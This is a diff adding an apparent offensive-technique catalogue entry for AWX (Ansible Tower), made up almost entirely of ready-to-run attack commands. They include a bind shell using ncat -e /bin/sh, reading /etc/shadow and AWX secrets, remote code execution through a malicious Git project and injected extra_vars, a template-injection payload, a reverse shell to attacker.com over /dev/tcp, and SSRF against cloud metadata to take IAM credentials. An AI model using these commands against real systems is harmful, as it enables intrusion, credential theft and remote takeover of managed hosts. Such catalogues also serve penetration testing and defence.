@@ -1,0 +1,214 @@
+---
+comment: "AWX is the open-source upstream of Ansible Tower \u2014 a web UI and REST\
+  \ API for managing Ansible\nplaybooks and job templates. Any user with Job Template\
+  \ execute permissions can run arbitrary\nAnsible tasks on managed hosts (and on\
+  \ the AWX execution environment itself).\n\nThe core attack surface: AWX users with\
+  \ \"execute\" permissions on a Job Template can inject\narbitrary Ansible tasks\
+  \ via extra_vars, callback plugins, or custom playbooks stored in a\nproject SCM.\
+  \ The AWX execution node runs the playbook inside an Execution Environment (EE)\n\
+  container \u2014 privilege escalation to the underlying AWX host requires a container\
+  \ escape\n(e.g., privileged EE or Docker socket mount).\n\nCVE-2022-2978 (CVSS 8.1):\
+  \ Authenticated RCE in AWX < 21.7.0 via extra_vars SSTI in Jinja2\ntemplate processing\
+  \ during playbook execution.\n\nCVE-2021-3620 (CVSS 5.5): Ansible-runner credential\
+  \ exposure via crafted extra_vars that\ncause credential secrets to be printed in\
+  \ task output.\n\nRef: https://www.exploit-db.com/exploits/50843\n"
+functions:
+  bind-shell:
+  - code: |
+      # Launch a job template that opens a bind shell on managed hosts via extra_vars
+      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"extra_vars": {"cmd": "ncat -lvp 12345 -e /bin/sh &"}}'
+
+      # Or deploy directly as a playbook task:
+      # - name: bind shell
+      #   ansible.builtin.shell: ncat -lvp 12345 -e /bin/sh &
+
+      # Connect from attacker: nc managed-host.local 12345
+    comment: |
+      Opens a bind shell on port 12345 of the managed Ansible host. The trailing & detaches
+      ncat from the task so the job completes without timing out. Connect with:
+      nc managed-host.local 12345
+    connector: tcp-client
+    contexts:
+      admin:
+    platform: linux
+    tty: false
+  file-read:
+  - code: |
+      # Read files from managed hosts via a job template task
+      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"extra_vars": {"cmd": "cat /etc/shadow"}}'
+
+      # Retrieve the output after the job completes:
+      JOB_ID=<job_id>
+      curl -s "http://awx.local/api/v2/jobs/$JOB_ID/stdout/?format=txt" \
+        -u "admin:admin"
+
+      # Read AWX application secrets directly from the AWX host environment:
+      # The AWX SECRET_KEY and database password are available in environment variables
+      # or /etc/tower/conf.d/*.py on bare-metal installs, and via k8s secrets on k8s.
+      curl -s "http://awx.local/api/v2/config/" -u "admin:admin" | python3 -m json.tool
+    comment: "AWX job output captures stdout from all Ansible tasks, making file reads\
+      \ from managed\nhosts non-blind. The /api/v2/config/ endpoint (admin only) exposes\
+      \ the AWX version,\nLDAP settings, and authentication configuration.\n\nOn Kubernetes\
+      \ installs, AWX secrets (SECRET_KEY, database credentials) are stored in\nk8s\
+      \ Secrets \u2014 readable via: kubectl get secret awx-secret-key -o jsonpath='{.data}'\n\
+      On bare-metal, look in /etc/tower/conf.d/ and /var/lib/awx/venv/awx/lib/.\n"
+    contexts:
+      admin:
+    platform: linux
+  rce:
+  - code: |
+      # Step 1: create a project pointing to an attacker-controlled Git repository
+      curl -s -X POST "http://awx.local/api/v2/projects/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{
+          "name": "exploit-project",
+          "scm_type": "git",
+          "scm_url": "https://github.com/attacker/malicious-playbooks.git",
+          "organization": 1
+        }'
+
+      # Step 2: create a Job Template using the malicious project and playbook
+      curl -s -X POST "http://awx.local/api/v2/job_templates/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{
+          "name": "exploit-template",
+          "job_type": "run",
+          "inventory": 1,
+          "project": <project_id>,
+          "playbook": "shell.yml",
+          "extra_vars": "{\"cmd\": \"id\"}",
+          "ask_variables_on_launch": true
+        }'
+
+      # Malicious playbook content (shell.yml in attacker Git repo):
+      # ---
+      # - hosts: all
+      #   gather_facts: false
+      #   tasks:
+      #     - name: rce
+      #       ansible.builtin.command: "{{ cmd }}"
+      #       register: out
+      #     - debug: var=out.stdout_lines
+
+      # Step 3: launch the job template
+      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"extra_vars": {"cmd": "id && hostname"}}'
+    comment: |
+      AWX job templates execute Ansible playbooks on managed inventory hosts. An admin user
+      can create a project pointing to an attacker-controlled Git repository, then define a
+      job template that runs a playbook with arbitrary shell commands via
+      ansible.builtin.command or ansible.builtin.shell tasks.
+
+      The job output (stdout) is captured in the AWX UI and REST API, making this non-blind.
+      Retrieve output via: GET /api/v2/jobs/<job_id>/stdout/?format=txt
+    contexts:
+      admin:
+    platform: linux
+  - code: "# Abuse extra_vars injection on an existing Job Template with ask_variables_on_launch=true\n\
+      # This works even with a low-privilege \"execute\" role \u2014 no admin required\n\
+      \n# Step 1: find job templates with ask_variables_on_launch=true\ncurl -s \"\
+      http://awx.local/api/v2/job_templates/?ask_variables_on_launch=true\" \\\n \
+      \ -u \"user:password\" | python3 -c \"\nimport sys, json\ndata = json.load(sys.stdin)\n\
+      for t in data['results']:\n    print(t['id'], t['name'], t['playbook'])\n\"\n\
+      \n# Step 2: launch the template with injected extra_vars\n# If the playbook\
+      \ uses {{ item }} or {{ var }} in a command task, inject shell metacharacters\n\
+      JOB=$(curl -s -X POST \"http://awx.local/api/v2/job_templates/1/launch/\" \\\
+      \n  -H \"Content-Type: application/json\" \\\n  -u \"user:password\" \\\n  -d\
+      \ '{\"extra_vars\": {\"cmd\": \"id; cat /etc/passwd\", \"item\": \"x; id #\"\
+      }}' | python3 -c \"import sys,json; print(json.load(sys.stdin)['id'])\")\n\n\
+      # Step 3: retrieve job output\nsleep 5\ncurl -s \"http://awx.local/api/v2/jobs/$JOB/stdout/?format=txt\"\
+      \ -u \"user:password\"\n"
+    comment: |
+      Job templates with ask_variables_on_launch=true allow any user with Execute role to
+      supply extra_vars at launch time. If the playbook uses Jinja2 template variables in
+      ansible.builtin.shell or ansible.builtin.command tasks, injecting shell metacharacters
+      via extra_vars achieves RCE on every managed host in the inventory.
+
+      CVE-2022-2978: Jinja2 SSTI in AWX < 21.7.0 allows extra_vars to escape template
+      sandboxing and execute arbitrary Python expressions on the AWX execution node itself
+      (not just managed hosts). Payload: {"cmd": "{{ self.__init__.__globals__.__builtins__.__import__('os').system('id') }}"}
+    contexts:
+      authenticated:
+    platform: linux
+    version: |
+      AWX < 21.7.0 (CVE-2022-2978)
+  reverse-shell:
+  - blind: true
+    code: |
+      # Deploy a reverse-shell playbook via a job template
+      # Attacker playbook (revshell.yml):
+      cat > /tmp/revshell.yml << 'EOF'
+      ---
+      - hosts: all
+        gather_facts: false
+        tasks:
+          - name: reverse shell
+            ansible.builtin.shell: |
+              bash -i >& /dev/tcp/attacker.com/12345 0>&1
+            async: 10
+            poll: 0
+      EOF
+
+      # Upload as a project file or reference via Git SCM, then launch:
+      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{}'
+
+      # Alternative: direct extra_vars injection if playbook uses shell task with {{ cmd }}:
+      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"extra_vars": {"cmd": "bash -i >& /dev/tcp/attacker.com/12345 0>&1"}}'
+    comment: |
+      Runs a reverse bash shell on the managed Ansible hosts via a job template. The shell
+      connects back to attacker.com:12345. Using async: 10 / poll: 0 prevents the Ansible
+      task from timing out waiting for the command to return.
+
+      The reverse shell runs as the SSH user configured in the AWX Machine Credential
+      (often root or a privileged service account). Set up listener: nc -lvnp 12345
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  ssrf:
+  - code: "# AWX Source Control credentials trigger an outbound Git clone/fetch when\
+      \ a project\n# is synced. Supply an internal URL to probe internal services.\n\
+      \n# Step 1: create a project with an internal SCM URL\ncurl -s -X POST \"http://awx.local/api/v2/projects/\"\
+      \ \\\n  -H \"Content-Type: application/json\" \\\n  -u \"admin:admin\" \\\n\
+      \  -d '{\n    \"name\": \"ssrf-probe\",\n    \"scm_type\": \"git\",\n    \"\
+      scm_url\": \"http://169.254.169.254/latest/meta-data/\",\n    \"organization\"\
+      : 1\n  }'\n\n# Step 2: trigger a project sync \u2014 AWX will attempt a git\
+      \ clone to the internal URL\nPROJECT_ID=<project_id>\ncurl -s -X POST \"http://awx.local/api/v2/projects/$PROJECT_ID/update/\"\
+      \ \\\n  -u \"admin:admin\"\n\n# Step 3: read the sync job output for HTTP response\
+      \ details\ncurl -s \"http://awx.local/api/v2/projects/$PROJECT_ID/playbooks/\"\
+      \ \\\n  -u \"admin:admin\"\n\n# Alternative: use an Inventory Source pointing\
+      \ to a custom script URL\n# AWX fetches the inventory script URL directly, returning\
+      \ the response to the user.\ncurl -s -X POST \"http://awx.local/api/v2/inventory_sources/\"\
+      \ \\\n  -H \"Content-Type: application/json\" \\\n  -u \"admin:admin\" \\\n\
+      \  -d '{\n    \"name\": \"ssrf-inv\",\n    \"source\": \"custom\",\n    \"source_vars\"\
+      : \"{\\\"url\\\": \\\"http://internal-service.local:8080/admin\\\"}\",\n   \
+      \ \"inventory\": 1\n  }'\n"
+    comment: |
+      AWX Project sync and Inventory Source features cause the AWX server to make outbound
+      HTTP/Git connections to user-supplied URLs. Error messages in sync job output often
+      reflect HTTP response content, enabling non-blind SSRF probing of internal services.
+
+      Target cloud IMDS (AWS 169.254.169.254, GCP metadata.google.internal) to retrieve
+      IAM credentials, or probe internal Kubernetes API servers, databases, and other
+      services not accessible from the attacker's network.
+    contexts:
+      admin:
+    platform: linux
+...
